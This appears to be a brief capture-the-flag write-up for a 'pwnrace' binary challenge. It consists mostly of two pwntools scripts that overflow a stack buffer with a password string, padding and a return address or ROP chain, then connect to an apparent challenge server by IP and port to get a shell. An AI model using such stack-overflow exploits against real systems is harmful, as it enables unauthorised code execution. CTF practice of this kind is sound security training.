### Chall Desc : 

### File attached : 

### Soln :

Script 

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwnrace_patched")
libc = ELF("./libc.so")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("159.223.101.241", 31337)

    return r


def main():
    r = conn()
    
    pause()
    
    # ret - shell
    r.sendline(b"hAcK_Th3_Pl@n3t\0" + b"A"*(248) + p64(0x04013a5) + p64(0x401300))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

Another scritp

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /tmp/pwnrace --host 159.223.101.241 --port 31337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/tmp/pwnrace')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '159.223.101.241'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)
# rop.call(rop.find_gadget(['ret']))
rop.main()
io.sendlineafter(b":", flat({0: b"hAcK_Th3_Pl@n3t\0", 0x108: rop.chain()}))

io.interactive()
```

for future reference 

---

Thank you
